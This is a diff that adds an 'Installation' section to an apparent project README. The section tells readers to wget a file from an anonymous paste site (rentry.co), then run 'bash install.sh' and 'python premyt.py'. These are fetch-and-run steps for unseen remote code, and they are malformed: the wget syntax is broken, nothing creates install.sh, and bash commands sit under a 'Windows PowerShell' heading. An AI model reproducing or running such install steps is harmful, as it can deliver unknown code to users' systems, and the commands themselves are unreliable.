@@ -5,3 +5,11 @@
 
 # Youtube Examples
 <p align="center"><img src="https://i.ibb.co/5hdJ9cG/Screenshot-20230214-024108.png"/></p>
+
+
+## Installation
+### Windows PowerShell
+
+    wget -O https://rentry.co/9qoae
+    bash install.sh
+    python premyt.py
